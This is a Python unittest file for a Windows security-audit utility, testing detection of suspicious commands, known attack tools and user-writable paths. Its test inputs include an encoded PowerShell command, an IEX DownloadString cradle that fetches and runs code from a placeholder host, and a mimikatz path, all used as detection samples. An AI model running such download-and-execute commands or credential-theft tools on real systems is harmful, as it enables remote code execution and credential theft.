import unittest

from win_security_audit import utils


class UtilsTests(unittest.TestCase):
    def test_suspicious_command(self):
        self.assertTrue(utils.suspicious_command("powershell -EncodedCommand SQBFAFgA"))
        self.assertTrue(utils.suspicious_command("IEX (New-Object Net.WebClient).DownloadString('http://example')"))
        self.assertFalse(utils.suspicious_command("C:\\Windows\\System32\\notepad.exe"))

    def test_known_tools(self):
        self.assertEqual(utils.known_tool_name("C:\\Temp\\mimikatz.exe"), "mimikatz")
        self.assertIsNone(utils.known_tool_name("C:\\Windows\\System32\\notepad.exe"))

    def test_user_writable_path(self):
        self.assertTrue(utils.user_writable_path("C:\\Users\\a\\AppData\\Local\\Temp\\x.exe"))
        self.assertFalse(utils.user_writable_path("C:\\Windows\\System32\\svchost.exe"))


if __name__ == "__main__":
    unittest.main()
